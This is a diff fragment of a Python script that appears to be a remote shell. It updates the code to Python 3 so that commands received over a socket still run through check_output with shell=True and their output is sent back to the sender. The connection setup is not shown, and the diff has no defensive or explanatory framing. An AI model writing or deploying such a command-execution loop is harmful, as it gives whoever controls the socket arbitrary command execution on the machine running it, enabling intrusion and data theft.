@@ -22,11 +22,11 @@ while 1:
             sock.close()
             break
         elif x.decode() == 'q':
-            print"\nClosing the connection\n"
+            print("\nClosing the connection\n")
             sock.close()
             break
         else:
-            out = check_output(x, shell=True)
+            out = check_output(x.decode(), shell=True)
             sock.send(out)
         continue
 
